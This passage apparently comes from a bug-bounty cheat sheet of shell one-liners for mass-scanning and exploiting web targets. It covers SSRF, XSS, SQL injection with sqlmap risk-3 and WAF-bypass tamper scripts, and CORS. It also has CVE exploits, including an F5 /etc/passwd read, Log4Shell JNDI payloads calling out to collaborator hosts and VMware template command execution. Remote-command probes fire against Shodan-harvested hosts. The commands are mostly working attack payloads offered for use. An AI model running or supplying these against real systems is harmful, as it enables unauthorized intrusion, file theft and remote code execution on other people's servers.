cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
-----------------------
## SSRF:
```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
```
cat file.txt | while read host do;do curl --path-as-is --insecure "$host/?unix:(7701 A's here) | "https://bugbounty.requestcatcher.com/ssrf" | grep "request caught" && echo "$host \033[0;31mVuln\n" || echo "$host \033[0;32mNot\n";done
```
```
cat wayback.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
```
----------------
## XSS:
```
cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```
gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
```
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
```
```
cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```
waybackurls target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```
cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```
echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq (freq or Airixss)
```
```
cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```
```
waybackurls target.com | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b hacker.xss.ht pipe > output.txt
```
```
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
---------------------
## Hidden Dirs:
```
dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
```
```
for URL in $(<targets.txt); do ( ffuf -u "${URL}/FUZZ" -w wordlists.txt -ac ); done
```
```
ffuf -c -u target.com -H "Host: FUZZ" -w wordlist.txt 
```
**Search for Sensitive files from Wayback**
```
waybackurls domain.com| grep - -color -E "1.xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt"
```
```
cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
```
-------------------
## SQLi:
```
cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3
```
----------------
## CORS:
```
gau "http://target.com" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
---------------
## Prototype Pollution:
```
subfinder -d target.com -all -silent | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
-------------
## CVEs:
### CVE-2020-5902:
```
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
### CVE-2020-3452:
```
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
### CVE-2021-44228:
```
cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done
```
```
cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt
```
### CVE-2022-0378:
```
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```
### CVE-2022-22954:
```
cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done
```
---------
## RCE:
```
cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent 
```
### vBulletin 5.6.2
```
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
```
subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
-----------
## JS Files:
### Find JS Files:
```
gau -subs target.com |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```
```
assetfinder target.com | waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
### Hidden Params in JS:
```
cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort | httpx -silent -threads 2000 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
### Extract sensitive end-point in JS:
```
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
-------------------------
### SSTI:
```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
---------------------------
## HeartBleed
```
cat urls.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line; safe; done
```
------------------
## Scan IPs
```
cat my_ips.txt | xargs -L100 shodan scan submit --wait 0
```
## Portscan
```
naabu -1 target.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -ports 1-65535 -silent -o out.txt
```
## Screenshots using Nuclei
```
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
## IPs from CIDR
```
echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
```
## SQLmap Tamper Scripts - WAF bypass
```
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 --no-cast --no-escape --dbs --random-agent
```
    
    
    
    


